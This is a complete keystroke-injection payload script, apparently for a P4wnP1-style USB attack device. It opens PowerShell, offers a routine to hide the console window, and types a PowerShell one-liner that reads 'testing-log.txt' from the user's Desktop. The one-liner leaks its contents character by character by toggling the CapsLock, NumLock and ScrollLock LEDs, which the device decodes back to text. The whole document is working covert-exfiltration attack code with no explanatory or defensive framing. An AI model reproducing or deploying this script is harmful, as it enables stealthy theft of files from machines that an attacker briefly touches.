layout('us');
typingSpeed(0, 0)

waitLED(ANY, 1000);
startPS();
// hidePS();
delay(500);

// Place the contents of ledToPi.ps1 as a single line into type()
// Be careful of the addition backslash needed for escaping \testing-log.txt
type("Function Get-LED-Sequence($strChr) {$chr = switch ($strChr) { 'a' { $sendChrs = 1,1,1 }'b' { $sendChrs = 1,1,2 }'c' { $sendChrs = 1,1,3 }'d' { $sendChrs = 1,2,1 }'e' { $sendChrs = 1,2,2 }'f' { $sendChrs = 1,2,3 }'g' { $sendChrs = 1,3,1 }'h' { $sendChrs = 1,3,2 }'i' { $sendChrs = 1,3,3 }'j' { $sendChrs = 2,1,1 }'k' { $sendChrs = 2,1,2 }'l' { $sendChrs = 2,1,3 }'m' { $sendChrs = 2,2,1 }'n' { $sendChrs = 2,2,2 }'o' { $sendChrs = 2,2,3 }'p' { $sendChrs = 2,3,1 }'q' { $sendChrs = 2,3,2 }'r' { $sendChrs = 2,3,3 }'s' { $sendChrs = 3,1,1 }'t' { $sendChrs = 3,1,2 }'u' { $sendChrs = 3,1,3 }'v' { $sendChrs = 3,2,1 }'w' { $sendChrs = 3,2,2 }'x' { $sendChrs = 3,2,3 }'y' { $sendChrs = 3,3,1 }'z' { $sendChrs = 3,3,2 }' ' { $sendChrs = 3,3,3 }default { $sendChrs = $null; '' }} if ($sendChrs -ne $null) {Send-LED-Keys($sendChrs)} return $chr;} Function Send-LED-Keys($sendChrs) {$keyBoardObject = New-Object -ComObject WScript.Shell;foreach ($chr in $sendChrs) {Start-Sleep -Milliseconds 10;switch ($chr) {1 { Write-Output 'PRINT CAPSLOCK'; $keyBoardObject.SendKeys('{CAPSLOCK}') }2 { Write-Output 'PRINT NUMLOCK'; $keyBoardObject.SendKeys('{NUMLOCK}') }3 { Write-Output 'PRINT SCROLLLOCK'; $keyBoardObject.SendKeys('{SCROLLLOCK}') }}}}$LogFilePath = [Environment]::GetFolderPath('Desktop')+'\\testing-log.txt'; [Array] $logFileArr = Get-Content $LogFilePath;Start-Sleep -Milliseconds 3000;Foreach($logLine in $logFileArr) {Foreach($logChar in $logLine.ToCharArray()) {Get-LED-Sequence($logChar);}}");
press("ENTER")

var res;
var strCombi = "";
var copiedText = "";
while (true) {
  res = waitLED(ANY, 5000);
  
  if (res.CAPS) {
    strCombi = strCombi + "1";
  } else if (res.NUM) {
    strCombi = strCombi + "2";
  } else if (res.SCROLL) {
    strCombi = strCombi + "3";
  } else if (res.TIMEOUT) {
    return copiedText
  }
  
  if (strCombi.length == 3) {
    copiedText = copiedText + getKey(strCombi);
    strCombi = ""
  }
}

//////////////////// FUNCTIONS BELOW ////////////////////

function startPS() {
	press("GUI r");
	delay(500);
	type("powershell\n")
}

// Hide an already opened PowerShell console, but keep input focus, to go on typing
function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  press("ENTER");
}

function getKey(str) {
  if (str == "111") {
    return "a";
  } else if (str == "112") {
    return "b";
  } else if (str == "113") {
    return "c";
  } else if (str == "121") {
    return "d";
  } else if (str == "122") {
    return "e";
  } else if (str == "123") {
    return "f";
  } else if (str == "131") {
    return "g";
  } else if (str == "132") {
    return "h";
  } else if (str == "133") {
    return "i";
  } else if (str == "211") {
    return "j";
  } else if (str == "212") {
    return "k";
  } else if (str == "213") {
    return "l";
  } else if (str == "221") {
    return "m";
  } else if (str == "222") {
    return "n";
  } else if (str == "223") {
    return "o";
  } else if (str == "231") {
    return "p";
  } else if (str == "232") {
    return "q";
  } else if (str == "233") {
    return "r";
  } else if (str == "311") {
    return "s";
  } else if (str == "312") {
    return "t";
  } else if (str == "313") {
    return "u";
  } else if (str == "321") {
    return "v";
  } else if (str == "322") {
    return "w";
  } else if (str == "323") {
    return "x";
  } else if (str == "331") {
    return "y";
  } else if (str == "332") {
    return "z";
  } else if (str == "333") {
    return " ";
  }
}